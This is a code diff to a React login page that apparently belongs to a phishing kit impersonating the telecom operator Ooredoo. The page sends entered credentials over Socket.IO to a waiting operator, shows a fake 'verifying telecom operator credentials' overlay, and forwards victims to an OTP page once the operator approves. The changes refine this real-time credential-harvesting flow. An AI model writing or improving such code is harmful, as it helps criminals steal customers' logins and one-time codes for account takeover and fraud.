@@ -3,12 +3,12 @@ import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import ApprovalWaitingOverlay from "@/components/ApprovalWaitingOverlay";
+import WaitingOverlay from "@/components/WaitingOverlay";
 import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
 import { Loader2, Eye, EyeOff, PhoneCall, ShieldCheck } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
-import { sendData, navigateToPage, isFormApproved, isFormRejected } from "@/lib/store";
+import { sendData, navigateToPage, isFormApproved, isFormRejected, waitingMessage } from "@/lib/store";
 import { getServiceContext } from "@/lib/serviceContext";
 
 const OoredooLogin = () => {
@@ -33,10 +33,18 @@ const OoredooLogin = () => {
     navigateToPage("تسجيل دخول Ooredoo");
   }, []);
 
+  // Reset approval/rejection signals on mount
+  useEffect(() => {
+    isFormApproved.value = false;
+    isFormRejected.value = false;
+  }, []);
+
   // Watch for admin approval
   useEffect(() => {
     if (!waiting) return;
     if (isFormApproved.value) {
+      isFormApproved.value = false;
+      waitingMessage.value = "";
       setWaiting(false);
       setLoading(false);
       navigate("/ooredoo-otp");
@@ -47,6 +55,8 @@ const OoredooLogin = () => {
   useEffect(() => {
     if (!waiting) return;
     if (isFormRejected.value) {
+      isFormRejected.value = false;
+      waitingMessage.value = "";
       setRejectionMessage(pick(
         "البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة",
         "The details you entered are incorrect. Please verify and try again."
@@ -63,6 +73,8 @@ const OoredooLogin = () => {
     if (!isValid) return;
     setLoading(true);
     clearRejectionMessage();
+    isFormApproved.value = false;
+    isFormRejected.value = false;
 
     // Send data via Socket.IO to admin
     sendData({
@@ -76,6 +88,7 @@ const OoredooLogin = () => {
       nextPage: "رمز OTP",
       waitingForAdminResponse: true,
       isCustom: true,
+      customWaitingMessage: pick("جارٍ التحقق من بيانات مشغّل الاتصالات...", "Verifying telecom operator credentials..."),
     });
 
     setWaiting(true);
@@ -83,15 +96,7 @@ const OoredooLogin = () => {
 
   return (
     <div className="min-h-screen bg-background relative" dir={dir}>
-      <ApprovalWaitingOverlay
-        open={waiting}
-        kind="login"
-        title={pick("جارٍ التحقق من بيانات مشغّل الاتصالات", "Verifying telecom operator credentials")}
-        subtitle={pick(
-          `مطابقة رقم الهاتف مع ${serviceContext.accountAr}`,
-          `Matching your phone number with your ${serviceContext.accountEn}`
-        )}
-      />
+      <WaitingOverlay />
       <RejectionBanner />
       <SiteHeader />
 
